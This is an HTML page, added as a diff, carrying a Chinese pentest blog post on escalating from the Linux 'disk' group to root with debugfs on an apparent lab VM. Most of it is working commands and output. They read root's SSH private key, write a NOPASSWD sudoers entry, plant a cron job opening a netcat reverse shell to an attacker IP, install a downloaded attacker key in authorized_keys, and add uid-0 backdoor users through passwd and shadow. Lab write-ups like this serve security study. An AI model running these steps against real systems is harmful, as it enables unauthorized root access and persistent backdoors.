@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - disk组用户提权</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>disk组用户提权</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-09 20:10</span>
+    </p>
+    <div class="post-body">
+        <h2>作者</h2>
+<p>共同创作者</p>
+<p><a href="https://the0n3.top/">111</a>   <a href="http://211.159.175.21/">MJ</a>   <a href="https://www.aristore.top/">Aristore</a>   <a href="https://space.bilibili.com/20805349">ll104567</a></p>
+<h2>Warning</h2>
+<p>测试发现，使用 debugfs 写入文件并重启后，可能出现的几种情况：</p>
+<ul>
+<li>正常运行</li>
+<li>文件系统变为只读，shell正常</li>
+<li>虚拟机崩溃，Virtualbox内存错误，再次重启，正常运行</li>
+<li>虚拟机系统崩溃</li>
+</ul>
+<p>异常一：文件系统变为只读</p>
+<p><img src="/images/disk-root/4.png" alt=""></p>
+<p>异常二：虚拟机崩溃（修改passwd,shadow）</p>
+<p>virtualbox报内存错误。再重启一次，可以使用篡改的 root 密码登录</p>
+<p><img src="/images/disk-root/6.png" alt=""></p>
+<p><img src="/images/disk-root/7.png" alt=""></p>
+<p>正常运行：</p>
+<p><img src="/images/disk-root/10.png" alt=""></p>
+<p style="color:red;"><b>文件系统变为只读的修复方案：</b></p>
+<p>在已经拿到root权限的情况下，执行以下命令修复文件系统：</p>
+<pre><code class="language-bash">mount -o ro /
+fsck -y /dev/sda1</code></pre>
+<p>这会恢复到上一个正确的时候，debugfs操作的文件会恢复之前的正确状态。</p>
+<p>建议优先使用稳妥的读取私钥的方式提权，再尝试sudo或写入公钥的方式提权，这会立即生效，最后再考虑需要重启才能生效的提权操作（passwd,shadow...）。</p>
+<p>本地靶机提权的话，打个快照随便玩了。</p>
+<ul>
+<li>读取私钥：最推荐</li>
+<li>sudo 提权：立即生效，推荐</li>
+<li>写入公钥：立即生效，推荐</li>
+<li>passwd 添加后门用户：需要重启，可能引起异常</li>
+<li>shadow 添加后门用户：需要重启，可能引起异常</li>
+<li>其他可能的文件写入提权：优先考虑无需重启的提权方式</li>
+</ul>
+<h2>读取私钥</h2>
+<p>disk组最推荐的提权方式，读取 root 用户的 ssh 私钥文件，然后使用私钥登录，相对其他方法提权，这不会引起内核异常崩溃。</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  cat /root/.ssh/id_rsa</code></pre>
+<h2>sudo</h2>
+<div class="callout callout-caution">
+<p>注意修改 sudo 授权用户名为当前用户</p>
+</div>
+<pre><code class="language-bash">Dodo@ezai1:~$ id
+uid=1000(Dodo) gid=1000(Dodo) groups=1000(Dodo),6(disk)
+Dodo@ezai1:~$ echo "Dodo ALL=(ALL) NOPASSWD: ALL" &gt; /tmp/give_dodo_sudo
+Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  write /tmp/give_dodo_sudo /etc/sudoers.d/give_dodo_sudo
+Allocated inode: 24
+debugfs:  ln &lt;24&gt; /etc/sudoers.d/give_dodo_sudo
+debugfs:  sif &lt;24&gt; i_mode 0100440
+debugfs:  sif &lt;24&gt; i_uid 0
+debugfs:  sif &lt;24&gt; i_gid 0
+debugfs:  q
+Dodo@ezai1:~$ sudo -l
+Matching Defaults entries for Dodo on ezai1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User Dodo may run the following commands on ezai1:
+    (ALL) NOPASSWD: ALL
+Dodo@ezai1:~$ sudo su -
+root@ezai1:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ezai1:~# </code></pre>
+<p><img src="/images/disk-root/3.png" alt=""></p>
+<h2>定时任务</h2>
+<p style="color:red;"><b>注意：定时任务部分未进行测试，谨慎使用！</b></p>
+<p style="color:red;"><b>注意：定时任务部分未进行测试，谨慎使用！</b></p>
+<blockquote>
+<p>定时任务补充信息</p>
+</blockquote>
+<p>常见定时任务文件位置与格式：</p>
+<pre><code class="language-plaintext">busybox crond   Alpine/容器精简系统   /etc/crontabs/&lt;user&gt;
+crond (Cronie)  CentOS / RHEL 系列    /etc/crontab + /etc/cron.d/*
+cron / Vixie cron   Debian / Ubuntu 系列  /etc/crontab + /etc/cron.d/*</code></pre>
+<p>文件内容格式：</p>
+<p>Alpine 系统下 /etc/crontabs/<user> 文件格式：</user></p>
+<pre><code class="language-plaintext">* * * * * command</code></pre>
+<p>非 Alpine 系统下 /etc/crontab 和 /etc/cron.d/* 文件格式：</p>
+<pre><code class="language-plaintext">* * * * * user command</code></pre>
+<p>对于非 Alpine 等精简系统，更推荐在 /etc/cron.d/ 目录下放置定时任务文件，文件名可以任意命名。</p>
+<p>使用 <code>uname -a</code> 查看系统信息，确定定时任务文件位置。</p>
+<p><img src="/images/disk-root/11.png" alt=""></p>
+<p>当前是 debian 10， 定时任务文件位置在 <code>/etc/crontab</code> 和 <code>/etc/cron.d/</code> 目录下，在 <code>/etc/cron.d/</code> 目录下创建一个 反弹shell 的定时任务。</p>
+<pre><code class="language-bash">ip=192.168.6.101
+port=4445
+echo "* * * * * root bash -c 'busybox nc $ip $port -e /bin/bash'" &gt; /tmp/test
+cat /tmp/test</code></pre>
+<p>使用 debugfs 写入定时任务文件</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  write /tmp/test /etc/cron.d/test
+Allocated inode: 23
+debugfs:  sif &lt;23&gt; i_mode 0100644
+debugfs:  sif &lt;23&gt; i_uid 0
+debugfs:  sif &lt;23&gt; i_gid 0
+debugfs:  q</code></pre>
+<h2>写入公钥</h2>
+<p>下载远程公钥并写入root用户的authorized_keys文件，对公钥进行权限和属主修改。</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ busybox wget http://192.168.56.100/pentest.pub -O authorized_keys
+Dodo@ezai1:~$ cp authorized_keys /tmp/root_pub
+Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  write /tmp/root_pub /root/.ssh/authorized_keys
+Allocated inode: 23
+debugfs:  ln &lt;23&gt; /root/.ssh/authorized_keys
+debugfs:  sif &lt;23&gt; i_mode 0100440
+debugfs:  sif &lt;23&gt; i_uid 0
+debugfs:  sif &lt;23&gt; i_gid 0
+debugfs:  q</code></pre>
+<p>攻击机</p>
+<p><img src="/images/disk-root/2.png" alt=""></p>
+<h2>passwd 添加后门用户</h2>
+<p>debugfs写入passwd文件，添加一个uid为0的用户。已存在的文件不能直接覆盖，先删除再写入，然后修改文件权限和属主。</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ cp /etc/passwd passwd
+Dodo@ezai1:~$ cp /etc/passwd passwd.bak
+Dodo@ezai1:~$ openssl passwd -1 -salt abc password
+$1$abc$BXBqpb9BZcZhXLgbee.0s/
+Dodo@ezai1:~$ echo 'test:$1$abc$BXBqpb9BZcZhXLgbee.0s/:0:0:,,,:/root:/bin/bash' &gt;&gt; passwd
+Dodo@ezai1:~$ cp passwd /tmp/passwd_tmp
+Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  write /tmp/passwd_tmp /etc/passwd
+write: Ext2 file already exists 
+debugfs:  rm /etc/passwd
+debugfs:  write /tmp/passwd_tmp /etc/passwd
+Allocated inode: 21
+debugfs:  ln &lt;21&gt; /etc/passwd
+debugfs:  sif &lt;21&gt; i_mode 0100644
+debugfs:  sif &lt;21&gt; i_uid 0
+debugfs:  sif &lt;21&gt; i_gid 0
+debugfs:  q</code></pre>
+<p>重启后，ssh登录 test 用户</p>
+<p><img src="/images/disk-root/1.png" alt=""></p>
+<h2>shadow 添加后门用户</h2>
+<p>debugfs 读取 shadow 文件</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  cat /etc/shadow
+root:$6$kRbauhnw3OEtnKk6$yXsjenRj0EuRJjuuMGlE07KQDOBKuI6E4aJm/UCld4DaqNjDtfKXVGaykJkiOE9PNohFgUk0WTn.4KcfCac3C.:20399:0:99999:7:::
+省略内容。。。。
+Dodo:$6$Viz4XTwZSwA00ngE$6WGPp6SfhFU/j/oosIBG/rYDBvX9QhpFPa8VWo3Q5fkWCJPmJUCsAL12WEkkUuQJ4ZwesrLJvymNAFTpeFqa00:20399:0:99999:7:::
+debugfs:</code></pre>
+<p>在家目录 下创建 shadow 文件，篡改 root 用户密码哈希，完事重启。</p>
+<pre><code class="language-bash">Dodo@ezai1:~$ mkpasswd -m sha-512 password
+$6$HmwaHrlwkvqL88gL$IKaAS2Rfz7IfkOzDnMJ2EzPm5wAFt6KQMmKterFKi6.7btziAkk3qXgFFVO1g624RhziuEATuzDAmsjA5gskX1
+Dodo@ezai1:~$ vim shadow
+Dodo@ezai1:~$ cp shadow /tmp/shadow_tmp
+Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
+debugfs 1.44.5 (15-Dec-2018)
+debugfs:  write /tmp/shadow_tmp /etc/shadow
+write: Ext2 file already exists 
+debugfs:  rm /etc/shadow
+debugfs:  write /tmp/shadow_tmp /etc/shadow
+Allocated inode: 21
+debugfs:  ln &lt;21&gt; /etc/shadow
+debugfs:  sif &lt;21&gt; i_mode 0100640
+debugfs:  sif &lt;21&gt; i_uid 0
+debugfs:  sif &lt;21&gt; i_gid 0
+debugfs:  q</code></pre>
+<p>在不重启的情况下，尝试使用 su 切换 root 用户，发现密码未被篡改成功</p>
+<p>重启后，出现严重问题，虚拟机崩溃，virtualbox 崩溃</p>
+<p><img src="/images/disk-root/7.png" alt=""></p>
+<p><img src="/images/disk-root/6.png" alt=""></p>
+<p>再次重启， 发现 root 密码已被篡改成功，使用 password 登录成功</p>
+<p><img src="/images/disk-root/8.png" alt=""></p>
+<p>文件系统没有进入只读状态</p>
+<p><img src="/images/disk-root/9.png" alt=""></p>
+<h2>其他</h2>
+<p>passwd、shadow都可以成功提权，其他可能的文件写入提权方式应该也没问题，优先考虑无需重启的提权方式。</p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#disk组</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
